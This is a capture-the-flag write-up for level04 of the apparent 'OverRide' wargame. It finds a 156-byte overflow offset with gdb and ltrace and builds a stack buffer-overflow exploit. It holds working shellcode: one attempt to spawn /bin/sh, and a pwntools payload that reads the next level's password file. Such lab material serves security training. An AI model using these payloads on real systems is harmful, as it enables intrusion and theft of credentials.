<pre>
$> gdb ./level04 
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r < <(echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA')
Starting program: /home/alarm/42/override/level04/Ressources/level04 < <(echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA')
[----------------------------------registers-----------------------------------]
ESP: 0xffffd5a0 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
<strong>EIP: 0x71414154 ('TAAq')</strong>
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x71414154
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x71414154 in ?? ()
gdb-peda$ pattern offset TAAq
<strong>TAAq found at offset: 156</strong>
</pre>

<pre>
$> echo a | ltrace -f ./level04 1>&-
[pid 1737] \_\_libc_start_main(0x80486c8, 1, -10540, 0x8048830, 0x80488a0 <unfinished ...>
[pid 1737] signal(14, 0x0804868f)                                      = NULL
[pid 1737] alarm(60)                                                   = 0
[pid 1737] fork()                                                      = 1738
[pid 1737] wait(0xffffd59c <unfinished ...>
[pid 1738] <... fork resumed> )                                        = 0
[pid 1738] prctl(1, 1, 0, 0xf7e2fe44, 2944)                            = 0
[pid 1738] ptrace(0, 0, 0, 0, 2944)                                    = -1
[pid 1738] puts("Give me some shellcode, k")                           = 26
<strong>[pid 1738] gets(-10848, 0, 0, 0, 2944)                                 = -10848</strong>
[pid 1738] +++ exited (status 0) +++
[pid 1737] --- SIGCHLD (Child exited) ---
[pid 1737] <... wait resumed> )                                        = 1738
[pid 1737] puts("child is exiting...")                                 = 20
[pid 1737] +++ exited (status 0) +++
$> printf '%x\n' -10848
ffffffff<strong>ffffd5a0</strong>
</pre>

<pre>
level04@OverRide:~$ (python -c "import struct; print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (156 - 21) + struct.pack('\<I', 0xffffd5a0))") | ./level04 
Give me some shellcode, k
no exec() for you
</pre>

<pre>
>>> pwn.asm(pwn.shellcraft.i386.linux.cat('/home/users/level05/.pass'))b'jsh.pashl05/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80'
>>> len('jsh.pashl05/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80')
62
</pre>

```
(python -c "import struct; print('jsh.pashl05/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80' + 'A' * (156 - 62) + struct.pack('<I', 0xffffd5a0))") | ./level04
```
